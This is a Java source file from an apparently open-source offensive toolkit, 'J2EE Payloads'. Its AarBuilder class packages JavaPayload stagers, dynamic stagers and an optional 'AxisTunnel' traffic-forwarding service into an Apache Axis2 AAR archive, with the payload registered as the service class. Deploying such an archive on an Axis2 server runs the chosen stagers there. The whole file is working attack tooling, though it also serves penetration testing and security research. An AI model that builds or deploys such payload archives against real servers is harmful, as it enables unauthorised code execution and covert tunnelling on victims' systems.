/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.builder;

import j2eepayload.axis.PayloadException;
import j2eepayload.axis.PayloadService;
import j2eepayload.axis.TunnelService;
import j2eepayload.dynstager.DynstagerSupportBuilder;

import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;

import javapayload.builder.Builder;
import javapayload.builder.JarBuilder;
import javapayload.loader.DynLoader;

public class AarBuilder extends Builder {

	public AarBuilder() {
		super("Build an Axis2 AAR file.", "");
	}

	public String getParameterSyntax() {
		return "[<filename>.aar] [--strip] <stager> [<moreStagers...>] [<dynstagers>_ <dynstagerArgs>]";
	}

	public void build(String[] args) throws Exception {
		StringBuffer aarName = new StringBuffer();
		final List classes = new ArrayList();
		boolean named = false, stripDebugInfo = false;
		classes.add(javapayload.stager.Stager.class);
		classes.add(PayloadService.class);
		classes.add(PayloadService.PayloadRunner.class);
		classes.add(PayloadException.class);
		Class serviceClass = PayloadService.class;
		for (int i = 0; i < args.length; i++) {
			if (i == 0 && args[i].endsWith(".aar")) {
				aarName.append(args[i].substring(0, args[i].length() - 4));
				named = true;
				continue;
			}
			if (args[i].endsWith("_")) {
				List dynstagerArgs = new ArrayList();
				for(int j = i+1; j < args.length; j++) {
					dynstagerArgs.add(args[j]);
				}
				classes.add(DynLoader.loadStager(args[i]+"LocalTest", null, 0));
				classes.add(DynstagerSupportBuilder.buildSupport(args[i], dynstagerArgs));
				break;
			}
			if (!named) {
				if (aarName.length() > 0)
					aarName.append('_');
				aarName.append(args[i].equals("--strip") ? "stripped" : args[i]);
			}
			if (args[i].equals("--strip")) {
				stripDebugInfo = true;
			} else if (args[i].equals("AxisTunnel")) {
				serviceClass = TunnelService.class;
				classes.add(jtcpfwd.util.PollingHandler.class);
				classes.add(jtcpfwd.util.PollingHandler.OutputStreamHandler.class);
				classes.add(TunnelService.class);
				classes.add(TunnelService.PayloadRunner.class);
				classes.add(javapayload.stager.LocalTest.class);
				classes.add(j2eepayload.dynstager.DynstagerSupport.class);
			} else {
				classes.add(DynLoader.loadStager(args[i], null, 0));
			}
		}
		String servicesXml = "<service>\r\n" +
				"	<messageReceivers><messageReceiver mep=\"http://www.w3.org/2004/08/wsdl/in-out\" class=\"org.apache.axis2.rpc.receivers.RPCMessageReceiver\"/></messageReceivers>\r\n" +
				"	<parameter name=\"ServiceClass\">" + serviceClass.getName() + "</parameter>\r\n" +
				"</service>";
		Manifest manifest = new Manifest();
		manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
		final JarOutputStream jos = new JarOutputStream(new FileOutputStream(aarName.append(".aar").toString()), manifest);
		JarBuilder.addClasses(jos, "", (Class[]) classes.toArray(new Class[classes.size()]), stripDebugInfo);
		jos.putNextEntry(new ZipEntry("META-INF/services.xml"));
		jos.write(servicesXml.getBytes("UTF-8"));
		jos.close();
	}
}
